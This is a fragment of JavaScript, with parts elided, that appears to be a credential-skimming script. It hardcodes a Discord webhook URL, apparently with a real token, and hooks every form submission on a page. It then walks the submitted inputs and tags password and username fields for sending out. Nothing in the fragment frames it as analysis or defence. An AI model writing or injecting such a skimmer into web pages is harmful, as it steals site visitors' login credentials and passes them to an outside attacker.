(function(){
  ...
  var WH = "https://discord.com/api/webhooks/1535979428914667640/c2TOAiDz7FCq5Ta2RiBet9YnO2ebXH3GFAFX0ZNCWmjlcuov-wdxiEg0jhCIyiiMbmvF";
  ...
  document.addEventListener("submit", function(e){
    ...
    for (var i = 0; i < inputs.length; i++){
      ...
      var icon = tp === "password" ? "🔑" : (tp === "username" ? "📧" : "📎");
